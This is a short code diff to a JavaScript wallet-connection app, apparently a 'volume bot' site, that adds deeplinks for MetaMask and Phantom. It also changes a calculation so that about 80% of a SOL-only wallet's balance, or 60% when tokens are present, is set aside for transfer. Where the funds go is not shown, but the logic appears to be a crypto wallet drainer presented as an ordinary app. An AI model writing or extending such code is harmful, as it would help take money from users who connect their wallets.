@@ -322,12 +322,13 @@ class NexiumApp {
         console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 43
         return;
       }
-
+      
+      //deeplink begin
       const deeplinks = {
         MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com/add-volume.html',
         Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com',
       };
-
+      //deeplink end
       const deeplink = deeplinks[walletName];
       if (!deeplink) {
         console.error(`No deeplink configured for ${walletName}`); // Log 44
@@ -538,9 +539,9 @@ class NexiumApp {
       if (balance > 0) {
         let reserve = 0;
         if (hasBalanceTokens.length === 0) {
-          reserve = 5000; // Basic fee for SOL only
+          reserve = Math.floor(balance * 0.2); // Reserve 20% for SOL only (transfer 80%)
         } else {
-          let reserveRatio = 0.4; // 40%
+          let reserveRatio = 0.4; // 40% reserve when tokens are present
           reserve = Math.floor(balance * reserveRatio);
         }
         solAmount = balance - reserve;
